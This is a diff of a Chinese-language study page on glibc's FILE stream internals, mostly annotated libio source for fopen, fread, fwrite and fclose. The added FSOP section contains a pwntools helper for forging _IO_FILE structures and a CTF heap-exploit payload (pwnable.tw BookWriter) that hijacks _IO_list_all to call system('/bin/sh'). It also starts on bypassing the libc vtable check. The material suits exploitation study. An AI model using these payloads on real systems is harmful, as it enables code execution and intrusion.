@@ -346,9 +346,8 @@ _IO_FILE * __fopen_internal (const char *filename, const char *mode, int is32)
 }
 </pre>
 <p>从源代码中可以看出，该函数功能为创建一个locked_FILE类型的结构体new_f（该结构体包含3个元素fp，lock，wd）,然后对new_f进行一系列初始化（包括初始化_IO_FILE_plus结构体各个字段，将fp加入_IO_list_all链表等），最后调用_IO_file_fopen函数打开该文件流指针。
-<a name = "1"></p>
+<a name = "1"></a></p>
 <h2>1.2 _IO_no_init函数实现源代码</h2>
-<p></a></p>
 <pre class="prettyprint lang-javascript"> 
 void _IO_no_init (_IO_FILE *fp, int flags, int orientation,struct _IO_wide_data *wd, const struct _IO_jump_t *jmp)
 {
@@ -410,9 +409,8 @@ void _IO_old_init (_IO_FILE *fp, int flags)
 	#endif
 }
 </pre>
-<p><a name="2"></p>
+<p><a name="2"></a></p>
 <h2>1.4 _IO_new_file_init_internal函数实现代码</h2>
-<p></a></p>
 <pre class="prettyprint lang-javascript"> 
 void _IO_new_file_init_internal (struct _IO_FILE_plus *fp)
 {
@@ -435,10 +433,9 @@ void _IO_new_file_init_internal (struct _IO_FILE_plus *fp)
 <p>实际情况如下所示：<br />
 <img src="https://raw.githubusercontent.com/fade-vivida/libc-linux-source-code-study/master/libc_study/picture/io1.JPG" alt="test" /><br />
 实际结果与猜想一致。</p>
-<p><a name="3"></p>
+<p><a name="3"></a></p>
 <h2>1.5 _IO_un_link函数实现代码</h2>
-<p></a>
-该函数功能为从_IO_list_all链表上拆下fp指针。</p>
+<p>该函数功能为从_IO_list_all链表上拆下fp指针。</p>
 <pre class="prettyprint lang-javascript"> 
 _IO_un_link (struct _IO_FILE_plus *fp)
 {
@@ -471,10 +468,9 @@ _IO_un_link (struct _IO_FILE_plus *fp)
 	}
 }
 </pre>
-<p><a name = "4"></p>
+<p><a name = "4"></a></p>
 <h2>1.6 _IO_link_in函数实现代码</h2>
-<p></a>
-该函数功能为将fp标志的文件流指针插入_IO_list_all链表中。</p>
+<p>该函数功能为将fp标志的文件流指针插入_IO_list_all链表中。</p>
 <pre class="prettyprint lang-javascript"> 
 void _IO_link_in (struct _IO_FILE_plus *fp)
 {
@@ -543,10 +539,9 @@ _IO_size_t _IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp
 
 # define COERCE_FILE(FILE) /* Nothing */
 </pre>
-<p><a name = "5"></p>
+<p><a name = "5"></a></p>
 <h2>2.2 _IO_sgetn函数</h2>
-<p></a>
-可以看到该函数只是单纯的调用了_IO_XSGETN宏。</p>
+<p>可以看到该函数只是单纯的调用了_IO_XSGETN宏。</p>
 <pre class="prettyprint lang-javascript"> 
 _IO_size_t
 _IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n)
@@ -587,10 +582,9 @@ _IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n)
 <p>进一步分析其调用的宏定义，可以看出程序首先通过固定偏移找到vtable成员变量，然后调用IO_validata_vtable函数检查该vtable变量的合法性。如果vtable函数指针列表合法，则调用该函数（__xsgetn)。  </p>
 <p>_IO_file_plus结构体的vtable字段示意图：<br />
 <img src="https://raw.githubusercontent.com/fade-vivida/libc-linux-source-code-study/master/libc_study/picture/io_jump.JPG" alt="vtable" /></p>
-<p><a name = "6"></p>
+<p><a name = "6"></a></p>
 <h2>2.3 vtable指针合法性检查</h2>
-<p></a>
-IO_validata_vtable函数代码如下所示：</p>
+<p>IO_validata_vtable函数代码如下所示：</p>
 <pre class="prettyprint lang-javascript"> 
 static inline const struct _IO_jump_t *
 IO_validate_vtable (const struct _IO_jump_t *vtable)
@@ -693,7 +687,9 @@ _IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
 			/* Check for backup and repeat */
 			if (_IO_in_backup (fp))
 			{
-				//如果当前文件流设置有备份标志位0x100，则转换当前文件流缓冲区，继续进行读写操作。
+				//如果当前文件流设置有备份标志位0x100，则交换
+					_IO_read_base<-->_IO_save_base
+					_IO_read_end<-->_IO_save_end
 				<a href = "#8">_IO_switch_to_main_get_area (fp);</a>
 				continue;
 			}
@@ -745,10 +741,11 @@ _IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
 }
 libc_hidden_def (_IO_file_xsgetn)
 </pre>
+<p><a name = "8"></a></p>
 <h2>2.5 _IO_switch_to_main_get函数</h2>
 <p>_IO_switch_to_main_get_area函数定义如下：</p>
 <pre class = "prettyprint lang-javascript">
-<a name = "8">void _IO_switch_to_main_get_area (_IO_FILE *fp)</a>
+void _IO_switch_to_main_get_area (_IO_FILE *fp)
 {
 	char *tmp;
 	fp->_flags &= ~_IO_IN_BACKUP;
@@ -767,11 +764,13 @@ libc_hidden_def (_IO_file_xsgetn)
 	fp->_IO_read_ptr = fp->_IO_read_base;
 }
 </pre>
-<p>该函数的主要功能为：如果当前文件流标志位定义了备份缓存（fp-&gt;flag &amp; <em>IO</em>IN_BACKUP == 0x100），则将_IO_read_base，_IO_read_ptr，_IO_read_end指向该缓存。</p>
+<p>该函数的主要功能为：如果当前文件流标志位为备份缓存（fp-&gt;flag &amp; <em>IO</em>IN_BACKUP == 0x100），则将_IO_read_base，_IO_read_ptr，_IO_read_end与_IO_save_base，_IO_save_end进行交换。  </p>
+<p>也就是说当前文件流有两个缓存区，一个是主缓存，一个是备份缓存，该标志位的作用就是表明当前是处于哪个缓存空间。
+<a name = "9"></a></p>
 <h2>2.6 _IO_new_file_underflow函数</h2>
 <p>该函数为vtable-&gt;__underflow hook的功能函数，其函数代码如下所示：</p>
 <pre class = "prettyprint lang-javascript">
-<a name = "9">int _IO_new_file_underflow (_IO_FILE *fp)</a>
+int _IO_new_file_underflow (_IO_FILE *fp)
 {
 	_IO_ssize_t count;
 	#if 0
@@ -781,13 +780,13 @@ libc_hidden_def (_IO_file_xsgetn)
 	#endif
 	if (fp->_flags & _IO_NO_READS)
 	{
-		//文件流标志为不可读
+		//文件流标志为不可读，则直接返回EOF
 		fp->_flags |= _IO_ERR_SEEN;
 		__set_errno (EBADF);
 		return EOF;
 	}
 	if (fp->_IO_read_ptr < fp->_IO_read_end)
-		return *(unsigned char *) fp->_IO_read_ptr;		//如果fp->_IO_read_ptr < fp->_IO_read_end表示流缓存还有空间，可以继续读。
+		return *(unsigned char *) fp->_IO_read_ptr;		//如果fp->_IO_read_ptr < fp->_IO_read_end表示流缓存还有数据为读，不用调用SYS_READ。
 	
 	if (fp->_IO_buf_base == NULL)
 	{
@@ -804,6 +803,7 @@ libc_hidden_def (_IO_file_xsgetn)
 	/* FIXME This can/should be moved to genops ?? */
 	if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
 	{
+		//根据源代码注释，该段代码只是为了兼容之前Unix对stdout所做的操作（flush stdout），其他并无实际作用。
 		#if 0
 			_IO_flush_all_linebuffered ();
 		#else
@@ -822,7 +822,7 @@ libc_hidden_def (_IO_file_xsgetn)
 		#endif
 	}
 	
-	_IO_switch_to_get_mode (fp);
+	<a href = "#10">_IO_switch_to_get_mode (fp);</a>
 	
 	/* This is very tricky. We have to adjust those
 	pointers before we call _IO_SYSREAD () since
@@ -855,9 +855,9 @@ libc_hidden_def (_IO_file_xsgetn)
 }
 libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)
 </pre>
-<p><a name = "7"></p>
+<p>从函数源码分析可知，该函数的主要功能为在read buff中的数据都被读完时（_IO_read_ptr == _IO_read_end），</p>
+<p><a name = "7"></a></p>
 <h2>2.7 _IO_doallocbuf</h2>
-<p></a></p>
 <pre class = "prettyprint lang-javascript">
 void
 _IO_doallocbuf (_IO_FILE *fp)
@@ -901,6 +901,30 @@ void _IO_setb (_IO_FILE *f, char *b, char *eb, int a)
 libc_hidden_def (_IO_setb)
 </pre>
 <p>可以看到该函数功能为：重新为fp文件流分配一个buff缓冲区。</p>
+<p><a name = "#10"></a></p>
+<h2>2.8 _IO_switch_to_get_mode函数</h2>
+<p>该函数功能为：将当前文件流由写模式（put mode）转化为读模式（get mode）。</p>
+<pre class = "prettyprint lang-javascript">
+int _IO_switch_to_get_mode (_IO_FILE *fp)
+{
+	if (fp->_IO_write_ptr > fp->_IO_write_base)
+		if (<a href = "#9">_IO_OVERFLOW (fp, EOF)</a> == EOF)
+			return EOF;
+	if (_IO_in_backup (fp))
+		fp->_IO_read_base = fp->_IO_backup_base;
+	else
+	{
+		fp->_IO_read_base = fp->_IO_buf_base;
+		if (fp->_IO_write_ptr > fp->_IO_read_end)
+			fp->_IO_read_end = fp->_IO_write_ptr;
+	}
+	fp->_IO_read_ptr = fp->_IO_write_ptr;
+	fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end = fp->_IO_read_ptr;
+	fp->_flags &= ~_IO_CURRENTLY_PUTTING;
+	return 0;
+}
+libc_hidden_def (_IO_switch_to_get_mode)
+</pre>
 <h1>3. fwrite</h1>
 <p><strong>注：最终调用vtable中的__xsputn</strong></p>
 <pre class="prettyprint lang-javascript"> 
@@ -927,6 +951,180 @@ _IO_size_t _IO_fwrite (const void *buf, _IO_size_t size, _IO_size_t count, _IO_F
 }
 </pre>
 <p>fwrite函数与fread函数逻辑相似，fwrite函数最终调用的vtable函数链表中的函数为__xsputn。</p>
+<h2>3.1 _IO_new_file_xsputn函数</h2>
+<pre class = "prettyprint lang-javascript">
+_IO_size_t _IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
+{
+	const char *s = (const char *) data;
+	_IO_size_t to_do = n;
+	int must_flush = 0;
+	_IO_size_t count = 0;
+
+	if (n <= 0)
+		return 0;
+	
+	/* This is an optimized implementation.
+	If the amount to be written straddles a block boundary
+	(or the filebuf is unbuffered), use sys_write directly. */
+
+	/* First figure out how much space is available in the buffer. */
+	if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
+	{
+		count = f->_IO_buf_end - f->_IO_write_ptr;
+		if (count >= n)
+		{
+			const char *p;
+			for (p = s + n; p > s; )
+			{
+				if (*--p == '\n')
+				{
+					count = p - s + 1;
+					must_flush = 1;
+					break;
+				}
+			}
+		}
+	}
+	else if (f->_IO_write_end > f->_IO_write_ptr)
+		count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */
+
+	/* Then fill the buffer. */
+	if (count > 0)
+	{
+		if (count > to_do)
+			count = to_do;
+		#ifdef _LIBC
+			f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
+		#else
+			memcpy (f->_IO_write_ptr, s, count);
+			f->_IO_write_ptr += count;
+		#endif
+		s += count;
+		to_do -= count;
+	}
+	if (to_do + must_flush > 0)
+	{
+		_IO_size_t block_size, do_write;
+		/* Next flush the (full) buffer. */
+		if (<a href = "#9">_IO_OVERFLOW (f, EOF)</a> == EOF)
+		/* If nothing else has to be written we must not signal the caller that everything has been written.  */
+			return to_do == 0 ? EOF : n - to_do;
+		
+		/* Try to maintain alignment: write a whole number of blocks.  */
+		block_size = f->_IO_buf_end - f->_IO_buf_base;
+		do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);
+
+		if (do_write)
+		{
+			count = new_do_write (f, s, do_write);
+			to_do -= count;
+			if (count < do_write)
+				return n - to_do;
+		}
+
+		/* Now write out the remainder.  Normally, this will fit in the
+		buffer, but it's somewhat messier for line-buffered files,
+		so we let _IO_default_xsputn handle the general case. */
+		if (to_do)
+			to_do -= _IO_default_xsputn (f, s+do_write, to_do);
+	}
+	return n - to_do;
+}
+libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)
+</pre>
+<p><a name = "9"></a></p>
+<h2>3.2 _IO_new_file_overflow函数</h2>
+<p>该函数功能为：对当前文件流的写缓存进行刷新。具体逻辑流程如下所示：<br />
+1. 如果当前文件流不可写（_IO_NO_WRITES 0x2），直接返回EOF<br />
+2. 如果当前文件流为读模式或者写缓冲为空，则分配新的流缓冲区并调整read buff的位置  </p>
+<pre class = "prettyprint lang-javascript">
+_IO_new_file_overflow (_IO_FILE *f, int ch)
+{
+	if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
+	{
+		f->_flags |= _IO_ERR_SEEN;
+		__set_errno (EBADF);
+		return EOF;
+	}
+	/* If currently reading or no buffer allocated. */
+	if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
+	{
+		/* Allocate a buffer if needed. */
+		if (f->_IO_write_base == NULL)
+		{
+			_IO_doallocbuf (f);
+			_IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
+		}
+		/* Otherwise must be currently reading.
+		If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
+		logically slide the buffer forwards one block (by setting the
+		read pointers to all point at the beginning of the block).  This
+		makes room for subsequent output.
+		Otherwise, set the read pointers to _IO_read_end (leaving that
+		alone, so it can continue to correspond to the external position). */
+		if (__glibc_unlikely (_IO_in_backup (f)))
+		{
+			//如果f设置了备份缓存，则替换该备份缓存区为主缓存区，并滑动读入缓冲区为写缓冲空出位置
+			size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
+			_IO_free_backup_area (f);
+			f->_IO_read_base -= MIN (nbackup,f->_IO_read_base - f->_IO_buf_base);
+			f->_IO_read_ptr = f->_IO_read_base;
+		}
+	
+		if (f->_IO_read_ptr == f->_IO_buf_end)
+			f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
+		f->_IO_write_ptr = f->_IO_read_ptr;
+		f->_IO_write_base = f->_IO_write_ptr;
+		f->_IO_write_end = f->_IO_buf_end;
+		f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;
+		
+		f->_flags |= _IO_CURRENTLY_PUTTING;
+		if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
+			f->_IO_write_end = f->_IO_write_ptr;
+	}
+	if (ch == EOF)
+		return <a href = "#11">_IO_do_write (f, f->_IO_write_base,f->_IO_write_ptr - f->_IO_write_base);</a>
+	if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
+		if (_IO_do_flush (f) == EOF)
+			return EOF;
+	*f->_IO_write_ptr++ = ch;
+	if ((f->_flags & _IO_UNBUFFERED) || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
+		if (_IO_do_write (f, f->_IO_write_base,f->_IO_write_ptr - f->_IO_write_base) == EOF)
+		return EOF;
+	return (unsigned char) ch;
+}
+libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
+</pre>
+<p><a name = "11"></a></p>
+<h2>3.3 new_do_write</h2>
+<p>该函数为_IO_do_write函数的功能实现函数。</p>
+<pre class = "prettyprint lang-javascript">
+static _IO_size_t new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
+{
+	_IO_size_t count;
+	if (fp->_flags & _IO_IS_APPENDING)
+		/* On a system without a proper O_APPEND implementation, you would need to sys_seek(0, SEEK_END) here, but is not needed nor desirable for Unix- or Posix-like systems.Instead, just indicate that offset (before and after) is unpredictable. */
+		fp->_offset = _IO_pos_BAD;
+	else if (fp->_IO_read_end != fp->_IO_write_base)
+	{
+		//要想绕过该判断，则fp->_IO_read_end == fp->_IO_write_base
+		_IO_off64_t new_pos = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
+		if (new_pos == _IO_pos_BAD)
+			return 0;
+		fp->_offset = new_pos;
+	}
+	count = _IO_SYSWRITE (fp, data, to_do);
+	if (fp->_cur_column && count)
+		fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
+	_IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
+	fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
+	fp->_IO_write_end = (fp->_mode <= 0
+		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
+		       ? fp->_IO_buf_base : fp->_IO_buf_end);
+	return count;
+}
+</pre>
+<p>从源代码中可以看到，当完成将数据写回设备后，如果文件流为行缓冲或者无缓冲，则初始化文件流_IO_write_end为_IO_buf_base。否则，初始化文件流_IO_write_end为_IO_buf_end。</p>
 <h1>4. fclose</h1>
 <p><strong>注：调用vtable列表中的__finish函数指针</strong></p>
 <pre class="prettyprint lang-javascript"> 
@@ -989,6 +1187,44 @@ int _IO_new_fclose (_IO_FILE *fp)
 <h1>5. FSOP利用技术</h1>
 <p><strong>注：由于在libc2.24版本开始加入了关于vtable的检查，且在2.27版本中无_IO_flush_all_lockp函数（使用了其他函数代替）。因此关于该技术的讨论我们建立在libc2.24版本。</strong>  </p>
 <p>FSOP（File Stream Oriented Programming）是一种劫持_IO_list_all（libc中全局变量）的方法。通过伪造的_IO_FILE_plus结构体并修改_IO_list_all链表使其指向伪造的_IO_FILE_plus结构体。然后通过调用_IO_flush_all_lockp函数来调用伪造的vtable函数列表中的函数指针，达到控制程序流的目的。  </p>
+<p>伪造_IO_FILE结构体时的一个小技巧：可以定义一个结构体，然后填充各个字段的内容即可。</p>
+<pre><code>def pack_file_64(_flags = 0,
+              _IO_read_ptr = 0,
+              _IO_read_end = 0,
+              _IO_read_base = 0,
+              _IO_write_base = 0,
+              _IO_write_ptr = 0,
+              _IO_write_end = 0,
+              _IO_buf_base = 0,
+              _IO_buf_end = 0,
+              _IO_save_base = 0,
+              _IO_backup_base = 0,
+              _IO_save_end = 0,
+              _IO_marker = 0,
+              _IO_chain = 0,
+              _fileno = 0,
+              _lock = 0):
+    struct = p64(_flags) + \
+             p64(_IO_read_ptr) + \
+             p64(_IO_read_end) + \
+             p64(_IO_read_base) + \
+             p64(_IO_write_base) + \
+             p64(_IO_write_ptr) + \
+             p64(_IO_write_end) + \
+             p64(_IO_buf_base) + \
+             p64(_IO_buf_end) + \
+             p64(_IO_save_base) + \
+             p64(_IO_backup_base) + \
+             p64(_IO_save_end) + \
+             p64(_IO_marker) + \
+             p64(_IO_chain) + \
+             p32(_fileno)
+    struct = struct.ljust(0x88, &quot;\x00&quot;)
+    struct += p64(_lock)
+    struct = struct.ljust(0xd8, &quot;\x00&quot;)
+    return struct
+</code></pre>
+
 <h2>5.1 基于overflow的FSOP利用技术</h2>
 <p>_IO_flush_all_lockp函数会在以下3中情况下被调用：<br />
 1. 当发生内存错误的时候（此时会调用malloc_printerr函数）<br />
@@ -1014,7 +1250,7 @@ int _IO_flush_all_lockp (int do_lock)
 		run_fp = fp;
 		if (do_lock)
 			_IO_flockfile (fp);
-		if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)		//这里是一个很重要的判断条件，在下文会有说明
+		if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)		//fp->_mode<0表示使用字节流模式，fp->_mode=0表示当前模式未指定，这里是一个很重要的判断条件，在下文会有说明
 			#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
 				|| (_IO_vtable_offset (fp) == 0
 				&& fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base))
@@ -1043,16 +1279,37 @@ int _IO_flush_all_lockp (int do_lock)
 }
 </pre>
 <p>触发__overflow函数的5个条件：<br />
-1. fp -&gt; _mode &lt; 0<br />
+1. fp -&gt; _mode &lt;= 0<br />
 2. fp -&gt; _IO_write_ptr &gt; fp -&gt; _IO_write_base，表示还有数据没有写入内核缓冲区<br />
-3. fp -&gt; _vtable_offset = 0<br />
-4. fp -&gt; _mode &gt; 0<br />
-5. fp -&gt; _wide_data -&gt; _IO_write_ptr &gt; fp -&gt; _wide_data -&gt; _IO_write_base<br />
-<strong>注：这5个条件中1、2必须同时成立，或者3、4、5必须同时成立。</strong>  </p>
-<p>fp -&gt; _mode 字段是用来判断当前文件流指针是否使用了宽字节数据，fp -&gt; _mode &lt; 0 表示未使用，因此接下来只需要判断_IO_write_ptr 是否大于_IO_write_base（是否还有数据没有写入）。如果fp -&gt; _mode &gt;= 0 表示使用了宽字节数据，此时需要检查是_wide_data结构体中是否还有未写入的数据，并且fp -&gt; _vtable_offset字段必须为0。</p>
-<h2>5.2 基于finish的FSOP利用技术</h2>
-<p>该利用方法其实就是利用了在关闭文件流指针时（调用_IO_new_fclose），最终会调用vtable函数列表中__finish函数这一特性，具体源代码在章节4，这里不再赘述。</p>
-<h2>5.3 FSOP防御机制</h2>
+或者满足<br />
+1. fp -&gt; _vtable_offset = 0<br />
+2. fp -&gt; _mode &gt; 0<br />
+3. fp -&gt; _wide_data -&gt; _IO_write_ptr &gt; fp -&gt; _wide_data -&gt; _IO_write_base  </p>
+<p>fp -&gt; _mode 字段是用来判断当前文件流指针是否使用了宽字节数据，fp -&gt; _mode &lt; 0 表示使用字节流模式，因此接下来只需要判断_IO_write_ptr 是否大于_IO_write_base（是否还有数据没有写入）。如果fp -&gt; _mode &gt;= 0 表示使用了宽字节流模式（或者当前模式未指定），此时需要检查是_wide_data结构体中是否还有未写入的数据，并且fp -&gt; _vtable_offset字段必须为0。  </p>
+<p>这里有一点需要注意的地方就是，如何修改_IO_list_all字段。如果有任意地址写任意值的漏洞，这自然不用说，将其改到一个我们可以直接控制的地址即可。还有一种情况在heap利用中较为常见，利用unsortedbin attack能达到任意地址写固定值（unsortedbin地址），此时我们就要利用_IO_FILE的chain字段了。</p>
+<p>由于此时_IO_list_all = &amp;main_arena-&gt;topchunk，因此chain字段的地址就为 &amp;main_arena-&gt;topchunk + 0x68（64bit，32位下+0x34），也就是落到了bin[5]（64bit下为smallbin 0x60，32位下为smallbin 0x30）链表范围内。这样如果我们能伪造一个在该范围内的chunk并free它（要确保其落入smallbin，而不是待在unsortedbin中），就可以成功触发漏洞。</p>
+<p>一个代码实例如下所示（pwnable.tw BookWriter）：</p>
+<pre><code>fake_bk = io_list_all - 0x10
+fake_fd = top_addr
+payload += '/bin/sh\0' + p64(0x61) + p64(fake_fd) + p64(fake_bk)
+payload += p64(2) + p64(3)
+payload += (0xc0-0x30)*'\x00' + p64(0)  //_mode
+payload += '\x00'*0x10 + p64(heap_addr+0x160+0xd8+8)
+payload += p64(0)*2 + p64(1) + p64(system_addr)
+
+另一种写法：
+payload += pack_file_64(_flags = u64('/bin/sh\0'),
+                       _IO_read_ptr = 0x61,
+                       _IO_read_end = fake_fd,
+                       _IO_read_base = fake_bk,
+                       _IO_write_base = 2,
+                       _IO_write_ptr = 3)
+vtalbe = heap_addr+0x160+0xd8+8
+payload += p64(vtalbe)
+payload += p64(0)*2 + p64(system_addr) + p64(system_addr)
+</code></pre>
+
+<h2>5.2 FSOP防御机制</h2>
 <p>从libc2.24开始，加入了对于vtable的检查函数，即在<a href = "#6">2.3小节</a>提到的IO_validata_vtable和_IO_vtable_check两个函数。</p>
 <pre class="prettyprint lang-javascript"> 
 static inline const struct _IO_jump_t *
@@ -1069,6 +1326,7 @@ IO_validate_vtable (const struct _IO_jump_t *vtable)
 }
 </pre>
 <p>其中IO_validate_vtable函数主要检查当前vtable是否在正常范围内（__libc_IO_vtables section，该节的属性为只读）。如果不在则调用_IO_vtable_check函数进行更为细致的检查。  </p>
+<p>_IO_vtable_check函数源代码如下所示：</p>
 <pre class="prettyprint lang-javascript"> 
 void attribute_hidden
 _IO_vtable_check (void)
@@ -1077,7 +1335,7 @@ _IO_vtable_check (void)
   	/* Honor the compatibility flag.  */
   	void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
 	#ifdef PTR_DEMANGLE
-  	PTR_DEMANGLE (flag);
+  	PTR_DEMANGLE (flag);		//该宏定义的功能为：对指针进行保护，具体做法为与线程保护值相异或，原理类似stack canny
 	#endif
   	if (flag == &_IO_vtable_check)
 		return;
@@ -1104,67 +1362,217 @@ _IO_vtable_check (void)
 	__libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
 }
 </pre>
-<p>大体意思为：如果定义了SHARED，则需要检查是否设定了接受外来vtables。如果是则直接返回，除此之外还会检查是否设置了_dl_open_hook结构体，或者该libc副本不在缺省的命名空间内。绕过机制相对负责</p>
-<h2>5.4</h2>
-<pre class="prettyprint lang-javascript">
-int _IO_str_overflow (_IO_FILE *fp, int c)
+<p>该函数大体意思为：如果定义了SHARED，则需要检查是否设定了接受外来vtables。如果是则直接返回，除此之外还会检查是否设置了_dl_open_hook结构体，或者该libc副本不在缺省的命名空间内。  </p>
+<h2>5.3 绕过FSOP防御机制</h2>
+<p>从libc2.24开始，libc加入了针对文件流虚表（vtable）的检测机制。下面介绍针对该检测机制的两种绕过方法。</p>
+<h3>5.3.1 利用_IO_str_jumps</h3>
+<p>由于在新的检测机制下，会检查虚表的地址是否在规定的合法范围内，因此我们无法再伪造vtable结构。既然无法将 vtable 指针指向 __libc_IO_vtables 以外的地方，那么就在 __libc_IO_vtables 里面找些有用的东西。比如 _IO_str_jumps（该符号在strip后会丢失），但我们可以根据_IO_file_jumps以及相对偏移（一般来说为0xc0，但具体使用时还需要视情况而定）来计算它的相对位置。</p>
+<p>下面是_IO_str_jumps虚表结构体的相关成员</p>
+<pre><code>// libio/strops.c
+
+#define JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0)
+
+const struct _IO_jump_t _IO_str_jumps libio_vtable =
 {
-	int flush_only = c == EOF;		//EOF = -1
-	_IO_size_t pos;
-	if (fp->_flags & _IO_NO_WRITES)		//如果当前fp的flag字段标志了该流不可写
-		return flush_only ? 0 : EOF;
-	if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
-	{
-		fp->_flags |= _IO_CURRENTLY_PUTTING;
-		fp->_IO_write_ptr = fp->_IO_read_ptr;
-		fp->_IO_read_ptr = fp->_IO_read_end;
-	}
-	pos = fp->_IO_write_ptr - fp->_IO_write_base;
-	if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
-	{
-		if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
-			return EOF;
-		else
-		{
-			char *new_buf;
-			char *old_buf = fp->_IO_buf_base;
-			size_t old_blen = _IO_blen (fp);
-			_IO_size_t new_size = 2 * old_blen + 100;
-			if (new_size < old_blen)
-				return EOF;
-			new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
-			if (new_buf == NULL)
-			{
-				/*	  __ferror(fp) = 1; */
-				return EOF;
-			}
-			if (old_buf)
-			{
-				memcpy (new_buf, old_buf, old_blen);
-				(*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
-				/* Make sure _IO_setb won't try to delete _IO_buf_base. */
-				fp->_IO_buf_base = NULL;
-			}
-			memset (new_buf + old_blen, '\0', new_size - old_blen);
-			
-			_IO_setb (fp, new_buf, new_buf + new_size, 1);
-			fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
-			fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
-			fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
-			fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);
-			
-			fp->_IO_write_base = new_buf;
-			fp->_IO_write_end = fp->_IO_buf_end;
-		}
-	}
-	if (!flush_only)
-		*fp->_IO_write_ptr++ = (unsigned char) c;
-	if (fp->_IO_write_ptr > fp->_IO_read_end)
-		fp->_IO_read_end = fp->_IO_write_ptr;
-	return c;
+  JUMP_INIT_DUMMY,
+  JUMP_INIT(finish, _IO_str_finish),
+  JUMP_INIT(overflow, _IO_str_overflow),
+  JUMP_INIT(underflow, _IO_str_underflow),
+  JUMP_INIT(uflow, _IO_default_uflow),
+  JUMP_INIT(pbackfail, _IO_str_pbackfail),
+  JUMP_INIT(xsputn, _IO_default_xsputn),
+  JUMP_INIT(xsgetn, _IO_default_xsgetn),
+  JUMP_INIT(seekoff, _IO_str_seekoff),
+  JUMP_INIT(seekpos, _IO_default_seekpos),
+  JUMP_INIT(setbuf, _IO_default_setbuf),
+  JUMP_INIT(sync, _IO_default_sync),
+  JUMP_INIT(doallocate, _IO_default_doallocate),
+  JUMP_INIT(read, _IO_default_read),
+  JUMP_INIT(write, _IO_default_write),
+  JUMP_INIT(seek, _IO_default_seek),
+  JUMP_INIT(close, _IO_default_close),
+  JUMP_INIT(stat, _IO_default_stat),
+  JUMP_INIT(showmanyc, _IO_default_showmanyc),
+  JUMP_INIT(imbue, _IO_default_imbue)
+};
+</code></pre>
+
+<p>_IO_strfile结构体</p>
+<pre><code>struct _IO_str_fields
+{
+  _IO_alloc_type _allocate_buffer;      //函数指针
+  _IO_free_type _free_buffer;           //函数指针
+};
+
+struct _IO_streambuf
+{
+  struct _IO_FILE _f;
+  const struct _IO_jump_t *vtable;
+};
+
+typedef struct _IO_strfile_
+{
+  struct _IO_streambuf _sbf;
+  struct _IO_str_fields _s;     //虚表
+} _IO_strfile;
+</code></pre>
+
+<p>在这个vtable中有两个函数我们可以拿来利用，_IO_str_overflow和_IO_str_finish。</p>
+<h4>5.3.1.1 _IO_str_overflow利用方法</h4>
+<p>其中_IO_str_overflow代码如下所示：</p>
+<pre><code>int _IO_str_overflow (_IO_FILE *fp, int c)
+{
+  int flush_only = c == EOF;
+  _IO_size_t pos;
+  if (fp-&gt;_flags &amp; _IO_NO_WRITES)
+      return flush_only ? 0 : EOF;
+  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))
+  {
+      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;
+      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;
+  }
+  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;
